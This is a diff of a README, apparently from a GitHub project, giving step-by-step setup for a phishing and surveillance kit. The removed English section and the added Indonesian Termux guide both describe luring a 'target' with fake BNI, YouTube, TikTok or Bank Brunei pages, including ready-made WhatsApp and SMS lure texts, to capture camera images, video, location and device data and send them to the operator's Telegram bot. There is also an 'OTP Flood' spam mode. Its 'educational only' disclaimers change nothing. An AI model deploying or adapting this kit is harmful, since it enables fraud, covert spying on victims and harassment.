@@ -1,234 +1,413 @@
-# 🚀 Bank Transfer Verification - Launch Guide
-**100% FREE - No Deployment - Python Terminal Only**
+# METACYTECH Tools — Panduan Lengkap Termux (HP Android)
 
-## 📋 PREREQUISITES
-
-### 1. **Install Python Dependencies**
-```bash
-cd d:\HACKING\transaksi-transfer-bank
-pip install -r requirements.txt
-```
-
-### 2. **Install Ngrok (MUST HAVE)**
-**Windows:**
-```bash
-# Download from https://ngrok.com/download
-# OR via Chocolatey:
-choco install ngrok
-
-# OR via npm:
-npm install -g ngrok
-```
-
-**Linux/Mac:**
-```bash
-# Download binary or
-brew install ngrok  # Mac
-# OR
-npm install -g ngrok
-```
-
-### 3. **Setup Telegram Bot (Optional but Recommended)**
-1. Create bot via @BotFather on Telegram
-2. Get `TELEGRAM_BOT_TOKEN`
-3. Get your `TELEGRAM_CHAT_ID` from `getUpdates`
-4. Create `.env.local` file:
-```env
-TELEGRAM_BOT_TOKEN=your_bot_token_here
-TELEGRAM_CHAT_ID=your_chat_id_here
-```
-
-## 🚀 HOW TO RUN
-
-### **Method 1: Simple Start**
-```bash
-cd d:\HACKING\transaksi-transfer-bank
-python launcher.py
-```
-
-### **Method 2: With Custom Config**
-Edit `launcher.py` section `CONFIG`:
-```python
-CONFIG = {
-    "fake_port": 8080,
-    "fake_title": "YouTube",
-    "fake_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-    "fake_delay": 3,  # Change delay time
-    "show_qr": True,  # Show QR code
-    "auto_open_browser": False
-}
-```
-
-## 🔗 WHAT HAPPENS WHEN YOU RUN
-
-```
-1. ✅ Fake YouTube server starts (port 8080)
-2. ✅ Next.js app starts (port 3000) 
-3. ✅ Ngrok tunnel creates PUBLIC URL
-4. ✅ QR code generated (scan with phone)
-5. ✅ System ready - Link displayed
-```
-
-## 📱 TARGET EXPERIENCE
-
-**Target receives link:** `https://abc123.ngrok.io`
-
-**What target sees:**
-```
-1. "Redirecting to YouTube..." (fake page)
-2. 3 second countdown with YouTube logo
-3. Verification app appears (seamless transition)
-4. Clicks anywhere → Camera/location permission
-5. Page unblurs (looks successful)
-6. Countdown 5 seconds
-7. Redirects to REAL YouTube video
-```
-
-**Target thinks:** "Oh, just a YouTube link that needed verification"
-
-## 🎯 HOW TO USE
-
-### **Step 1: Start the System**
-```bash
-python launcher.py
-```
-
-### **Step 2: Get Public Link**
-System will display:
-```
-🌐 Public URL: https://abc123.ngrok.io
-📱 SCAN QR CODE TO OPEN LINK ON PHONE
-```
-
-### **Step 3: Send to Target**
-**Via WhatsApp:**
-```
-"Bang, bukti transfer: https://abc123.ngrok.io
-Ini link verifikasi buat keamanan transaksi."
-```
-
-**Via SMS:**
-```
-"BNI: Transfer Anda berhasil. Verifikasi: https://abc123.ngrok.io"
-```
-
-### **Step 4: Monitor Results**
-1. Keep Python terminal running
-2. Data will be sent to your Telegram bot
-3. Includes: Photo, 10s video, location, device info
-
-## ⚙️ CUSTOMIZATION
-
-### **Change Redirect Destination**
-Edit in `launcher.py`:
-```python
-"fake_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-```
-Change to:
-- News: `"https://www.kompas.com"`
-- Social: `"https://twitter.com"`
-- Bank: `"https://bni.co.id"`
-
-### **Change Fake Page Design**
-Edit `FakeLandingHandler` class in `launcher.py`:
-- Change logo, colors, text
-- Add different platform (Twitter, Instagram, etc.)
-
-### **No Ngrok Alternative**
-Set in `launcher.py`:
-```python
-"use_ngrok": False,
-```
-Then use `localtunnel`:
-```bash
-npm install -g localtunnel
-npx lt --port 8080 --subdomain mybank
-```
-
-## 🛠️ TROUBLESHOOTING
-
-### **Ngrok Not Found**
-```bash
-# Download manually from ngrok.com
-# Add to PATH or place in project folder
-```
-
-### **Port Already in Use**
-Edit `launcher.py`:
-```python
-"fake_port": 8081,  # Change port
-"app_port": 3001,   # Change port
-```
-
-### **Telegram Data Not Sending**
-1. Check `.env.local` file exists
-2. Verify token and chat ID are correct
-3. Start conversation with bot first
-4. Test manually:
-```bash
-curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=test"
-```
-
-### **Camera Not Working**
-- Must use HTTPS (ngrok provides this)
-- Browser may block autoplay (still redirects)
-- User must click to activate camera
-
-## 🔒 SECURITY NOTES
-
-⚠️ **FOR EDUCATIONAL PURPOSES ONLY**
-- Browser always asks permission first
-- User can deny camera/location access
-- HTTPS required by browsers
-- Data only sent to YOUR Telegram bot
-- No data stored on server
-
-## 📁 PROJECT STRUCTURE
-
-```
-transaksi-transfer-bank/
-├── launcher.py          # Main Python launcher
-├── requirements.txt     # Python dependencies
-├── RUN_GUIDE.md        # This file
-├── REDIRECT_CONFIG.md  # Redirect configuration
-├── src/                # Next.js app
-├── public/             # Static files
-└── package.json        # Node.js dependencies
-```
-
-## 🎮 QUICK COMMANDS
-
-```bash
-# Start everything
-python launcher.py
-
-# Install dependencies
-pip install -r requirements.txt
-npm install
-
-# Test ngrok only
-ngrok http 8080
-
-# Test Next.js only
-npm run dev
-
-# Check Telegram config
-type .env.local
-```
-
-## 🆘 NEED HELP?
-
-1. **Ngrok issues**: https://ngrok.com/docs
-2. **Telegram bot**: https://core.telegram.org/bots
-3. **Next.js errors**: Check browser console
-4. **Python errors**: Check launcher.py config
+> **Target pembaca:** Pemula — langkah demi langkah dari nol sampai dapat URL publik.
+> 
+> **Perkiraan waktu:** 15-30 menit (tergantung kecepatan internet HP).
 
 ---
 
-**🚀 READY TO LAUNCH?**
+## Daftar Isi
+
+1. [Persiapan Awal](#1-persiapan-awal)
+2. [Install Bahan-Bahan](#2-install-bahan-bahan)
+3. [Clone Project](#3-clone-project)
+4. [Setup Telegram (Wajib)](#4-setup-telegram-wajib)
+5. [Jalankan Tool](#5-jalankan-tool)
+6. [Troubleshooting](#6-troubleshooting)
+7. [Referensi Cepat](#7-referensi-cepat)
+
+---
+
+## 1. Persiapan Awal
+
+### 1.1 Install Termux
+
+1. Buka Google Play Store atau F-Droid
+2. Cari **"Termux"**
+3. Install
+
+> [!TIP]
+> **Gunakan Termux dari F-Droid** (termux.com) — versi Play Store sering kedaluwarsa.
+
+### 1.2 Buka Termux
+
+Buka aplikasi Termux. Layar akan hitam dengan kursor berkedip — itu terminal.
+
+### 1.3 Update Termux
+
+Ketik perintah ini satu per satu (tekan Enter setelah setiap baris):
+
 ```bash
-cd d:\HACKING\transaksi-transfer-bank
+pkg update -y
+pkg upgrade -y
+```
+
+Tunggu sampai selesai (bisa 2-5 menit). Ketik `Y` atau `y` jika diminta konfirmasi.
+
+### 1.4 Beri Izin Storage
+
+Termux butuh akses ke penyimpanan HP:
+
+```bash
+termux-setup-storage
+```
+
+Akan muncul popup di HP — tekan **"Izinkan"** atau **"Allow"**.
+
+---
+
+## 2. Install Bahan-Bahan
+
+Jalankan perintah ini satu per satu. Biarkan selesai sebelum lanjut.
+
+### 2.1 Python
+
+```bash
+pkg install python -y
+```
+
+Cek:
+
+```bash
+python --version
+```
+
+Harus muncul: `Python 3.13.x` atau lebih baru.
+
+### 2.2 Node.js
+
+```bash
+pkg install nodejs-lts -y
+```
+
+Cek:
+
+```bash
+node --version
+npm --version
+```
+
+Harus muncul versi (contoh: `v22.x.x` dan `10.x.x`).
+
+### 2.3 Git
+
+```bash
+pkg install git -y
+```
+
+### 2.4 Cloudflared (Tunnel — biar dapat URL publik)
+
+```bash
+pkg install cloudflared -y
+```
+
+Cek:
+
+```bash
+cloudflared --version
+```
+
+Harus muncul versi (contoh: `2026.x.x`).
+
+### 2.5 Python Dependencies
+
+```bash
+pip install requests qrcode
+```
+
+---
+
+## 3. Clone Project
+
+Pindah ke storage internal:
+
+```bash
+cd ~/storage/downloads
+```
+
+Clone project dari GitHub:
+
+```bash
+git clone https://github.com/iqbalgsr46/metacytech-tools.git
+```
+
+Masuk ke folder project:
+
+```bash
+cd metacytech-tools
+```
+
+---
+
+## 4. Setup Telegram (Wajib)
+
+> [!WARNING]
+> **Tanpa Telegram, data target tidak akan terkirim ke mana-mana.**
+> Kamera, lokasi, IP — semua terkirim lewat Telegram.
+
+### 4.1 Buat Bot Telegram
+
+1. Buka Telegram di HP lain
+2. Cari **@BotFather**
+3. Kirim perintah: `/newbot`
+4. Ikuti instruksi — nanti dapat **Bot Token** (format: `123456:ABC-DEF...`)
+5. Simpan token-nya
+
+### 4.2 Dapatkan Chat ID
+
+1. Buat grup baru di Telegram
+2. Masukkan bot tadi ke grup (jadikan admin)
+3. Kirim pesan apa saja ke grup (misalnya "test")
+4. Buka link ini di browser (ganti `<TOKEN>` punya kamu):
+   ```
+   https://api.telegram.org/bot<TOKEN>/getUpdates
+   ```
+5. Cari angka `"chat":{"id":` — itu Chat ID-nya (contoh: `-100123456789`)
+
+### 4.3 Buat File Konfigurasi
+
+Di Termux, jalankan:
+
+```bash
+nano .env.local
+```
+
+Copy-paste ini (ganti token dan chat id punya kamu):
+
+```env
+TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
+TELEGRAM_CHAT_ID=-100123456789
+```
+
+Tekan:
+- **Ctrl+X** (keluar)
+- **Y** (simpan)
+- **Enter** (konfirmasi nama file)
+
+---
+
+## 5. Jalankan Tool
+
+### 5.1 Metode termudah — pakai run.sh
+
+```bash
+bash run.sh
+```
+
+Script ini akan:
+- Install npm dependencies otomatis
+- Deteksi Termux + install cloudflared
+- Jalankan launcher Python
+
+### 5.2 Atau manual — pakai Python
+
+```bash
 python launcher.py
 ```
 
-Send the generated link to target and monitor Telegram for data! 🎯
+### 5.3 Pilih Template
+
+```
+  Pilih template (1-4): 2
+```
+
+| Nomor | Template | Fungsi |
+|-------|----------|--------|
+| 1 | BNI | Transfer Bank Verification |
+| 2 | TikTok | Video Share Link (kamera + lokasi) |
+| 3 | BIBD | Bank Brunei Darussalam |
+| 4 | OTP Flood | Spam OTP multi-brand |
+
+Jika pilih **TikTok** (nomor 2), kamu akan diminta **Custom Title**:
+
+```
+  Title URL: TikTok - Free ChatGpt Pro
+```
+
+Bisa dikosongkan untuk default.
+
+### 5.4 Tunggu Proses
+
+Tool akan otomatis:
+
+1. **Applying template** — Copy file template
+2. **Building** — Build Next.js (bisa lambat 3-10 menit di HP — sabar)
+3. **Starting server** — Jalankan server di port 3000
+4. **Starting tunnel** — Dapatkan URL publik lewat Cloudflare Tunnel
+
+> [!NOTE]
+> **Build pertama biasanya lambat** (5-15 menit) karena harus compile semua dependensi. Build selanjutnya lebih cepat karena sudah tersimpan di cache.
+
+Kalau berhasil, akan muncul:
+
+```
+  url  https://xxxx-xxxx-xxxx-xxxx.trycloudflare.com
+  local  http://localhost:3000
+```
+
+### 5.5 Bagikan URL
+
+- **URL** itu yang kamu bagikan ke target
+- Saat target buka link itu, mereka akan lihat halaman TikTok/BNI/BIBD
+- Setelah target izinkan kamera/lokasi, data langsung terkirim ke Telegram kamu
+
+### 5.6 Menu Operasi
+
+```
+  [1]  Mulai Semua       — Build + Server + Tunnel
+  [2]  Hentikan Semua     — Matikan semua
+  [3]  Status             — Cek apakah server/tunnel jalan
+  [4]  Salin URL          — Salin URL publik
+  [5]  Ganti Template     — Ganti BNI/TikTok/BIBD
+  [6]  Keluar             — Stop semua + keluar
+```
+
+---
+
+## 6. Troubleshooting
+
+### ❌ "Python tidak ditemukan"
+
+```bash
+pkg install python -y
+```
+
+### ❌ "Node.js tidak ditemukan"
+
+```bash
+pkg install nodejs-lts -y
+```
+
+### ❌ Build error: Turbopack tidak support ARM
+
+**Masalah:** Next.js 16 (Turbopack) tidak berjalan di ARM64 (kebanyakan HP Android).
+
+**Solusi:** Launcher akan otomatis downgrade ke Next.js 15 (Webpack) saat mendeteksi Termux.
+Tapi build akan lebih lambat. Sabar tunggu 5-15 menit.
+
+### ❌ Build terlalu lama
+
+Ini normal di HP kelas menengah ke bawah. Beberapa tips:
+
+- Tutup aplikasi lain biar RAM lega
+- Pastikan HP nggak overheating
+- Kalau stuck, bunuh proses (Ctrl+C), hapus `node_modules` dan `package-lock.json`:
+  ```bash
+  rm -rf node_modules package-lock.json
+  python launcher.py
+  ```
+- Kalau masih lama, coba pake **OTP Flood mode** (template [4]) — tidak perlu build server.
+
+### ❌ Cloudflare Tunnel gagal
+
+Jika cloudflared gagal, tool auto-fallback ke **ngrok**.
+
+Tapi kalau dua-duanya gagal, install manual ngrok:
+
+```bash
+pkg install wget -y
+cd ~
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
+unzip ngrok-v3-stable-linux-arm64.zip
+chmod +x ngrok
+mv ngrok $PREFIX/bin/
+ngrok config add-authtoken <TOKEN_KAMU>
+```
+
+Daftar gratis di [ngrok.com](https://ngrok.com) untuk dapat authtoken.
+
+### ❌ Telegram tidak kirim data
+
+Cek file `.env.local`:
+
+```bash
+cat .env.local
+```
+
+Pastikan isinya benar:
+
+```env
+TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
+TELEGRAM_CHAT_ID=-100123456789
+```
+
+Test kirim pesan manual:
+
+```bash
+curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
+```
+
+### ❌ Port 3000 sudah dipakai
+
+```bash
+pkill -9 -f "node"
+pkill -9 -f "next"
+```
+
+Lalu jalankan ulang.
+
+### ❌ "No space left on device"
+
+Cache npm dan pip bisa membesar. Bersihkan:
+
+```bash
+pkg clean
+pip cache purge
+rm -rf ~/.npm/_cacache
+```
+
+---
+
+## 7. Referensi Cepat
+
+### Install dari Nol (Semua Perintah)
+
+```bash
+# 1. Update
+pkg update -y && pkg upgrade -y
+
+# 2. Install semua
+pkg install -y python nodejs-lts git cloudflared
+
+# 3. Python deps
+pip install requests qrcode
+
+# 4. Clone project
+cd ~/storage/downloads
+git clone https://github.com/iqbalgsr46/metacytech-tools.git
+cd metacytech-tools
+
+# 5. Setup Telegram — EDIT dulu .env.local (lihat bagian 4.3)
+nano .env.local
+
+# 6. Jalankan
+bash run.sh
+```
+
+### Perintah Penting
+
+| Perintah | Fungsi |
+|----------|--------|
+| `bash run.sh` | Jalankan tool (auto install) |
+| `python launcher.py` | Jalankan tool langsung |
+| `nano .env.local` | Edit konfigurasi Telegram |
+| `cat .env.local` | Lihat konfigurasi Telegram |
+| `pkill -9 -f node` | Matikan semua proses Node.js |
+| `pkill -9 -f cloudflared` | Matikan tunnel |
+| `rm -rf node_modules package-lock.json` | Reset npm modules |
+| `git pull` | Update ke versi terbaru |
+
+### Update Tool ke Versi Terbaru
+
+```bash
+cd ~/storage/downloads/metacytech-tools
+git pull
+bash run.sh
+```
+
+---
+
+> [!CAUTION]
+> **Gunakan hanya untuk edukasi dan authorized security testing.**
+> Tanpa izin tertulis dari target = ILEGAL (UU ITE Pasal 30-35).
+> Segala penyalahgunaan adalah tanggung jawab pengguna sepenuhnya.
